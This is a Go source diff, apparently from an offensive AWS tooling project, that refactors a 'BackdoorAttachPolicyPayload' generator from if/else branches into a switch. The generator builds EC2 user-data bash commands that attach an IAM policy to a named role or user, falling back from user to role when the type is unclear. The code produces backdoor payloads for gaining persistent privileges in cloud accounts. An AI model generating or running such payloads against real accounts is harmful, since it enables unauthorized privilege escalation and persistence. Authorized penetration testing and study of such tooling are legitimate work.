@@ -65,11 +65,12 @@ func (p *BackdoorAttachPolicyPayload) GenerateCode(options map[string]string) (s
 	// For EC2 user-data we generate bash -- build the attach command based on detected type.
 	// If we can't determine the type from the ARN (plain name), try user first then role.
 	var attachCommand string
-	if principalType == "role" {
+	switch principalType {
+	case "role":
 		attachCommand = fmt.Sprintf("aws iam attach-role-policy --role-name %s --policy-arn %s", principalName, policyArn)
-	} else if principalType == "user" {
+	case "user":
 		attachCommand = fmt.Sprintf("aws iam attach-user-policy --user-name %s --policy-arn %s", principalName, policyArn)
-	} else {
+	default:
 		// Plain name -- try user, fall back to role
 		attachCommand = fmt.Sprintf(`aws iam attach-user-policy --user-name %s --policy-arn %s 2>/dev/null || \
     aws iam attach-role-policy --role-name %s --policy-arn %s`, principalName, policyArn, principalName, policyArn)
